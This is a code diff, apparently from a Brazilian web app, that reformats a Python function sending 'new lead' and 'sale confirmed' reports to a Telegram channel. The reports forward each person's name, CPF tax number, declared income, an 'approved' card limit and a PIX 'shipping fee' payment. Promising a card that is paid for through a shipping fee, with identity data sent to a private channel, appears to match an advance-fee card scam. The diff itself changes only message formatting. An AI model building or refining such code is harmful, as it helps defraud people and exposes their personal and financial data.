@@ -479,22 +479,22 @@ def send_telegram_report(session_id, is_paid=False):
     if lead['pix_status'] not in ['paid', 'completed'] and is_paid:
         status_icon = "✅ PAGO"
         
-    texto = f"📊 *NOVA VENDA CONFIRMADA!*\\n\\n" if is_paid else f"📊 *NOVO LEAD GERADO!*\\n\\n"
+    texto = f"📊 <b>NOVA VENDA CONFIRMADA!</b>\n\n" if is_paid else f"📊 <b>NOVO LEAD GERADO!</b>\n\n"
     texto += (
-        f"👤 *Nome:* {lead['nome']}\\n"
-        f"💳 *CPF:* {lead['cpf']}\\n"
-        f"💰 *Renda Declarada:* {lead['renda']}\\n"
-        f"🎯 *Limite Aprovado:* R$ {lead['limite_aprovado']}\\n"
-        f"🎨 *Estilo Cartão:* {lead['card_style']} ({lead['card_color']})\\n"
-        f"🚚 *Status PIX:* {status_icon}\\n"
+        f"👤 <b>Nome:</b> {lead['nome']}\n"
+        f"💳 <b>CPF:</b> <code>{lead['cpf']}</code>\n"
+        f"💰 <b>Renda Declarada:</b> {lead['renda']}\n"
+        f"🎯 <b>Limite Aprovado:</b> R$ {lead['limite_aprovado']}\n"
+        f"🎨 <b>Estilo Cartão:</b> {lead['card_style']} ({lead['card_color']})\n"
+        f"🚚 <b>Status PIX:</b> {status_icon}\n"
     )
     if pay:
-        texto += f"💵 *Valor do Frete:* R$ {pay['amount']}\\n"
-        texto += f"🆔 *ID Pgto:* `{pay['payment_id']}`\\n"
+        texto += f"💵 <b>Valor do Frete:</b> R$ {pay['amount']}\n"
+        texto += f"🆔 <b>ID Pgto:</b> <code>{pay['payment_id']}</code>\n"
 
     try:
         import requests
-        payload = {"chat_id": channel, "text": texto, "parse_mode": "Markdown"}
+        payload = {"chat_id": channel, "text": texto, "parse_mode": "HTML"}
         if thread_id: payload["message_thread_id"] = thread_id
         if channel:
             requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json=payload, timeout=5)
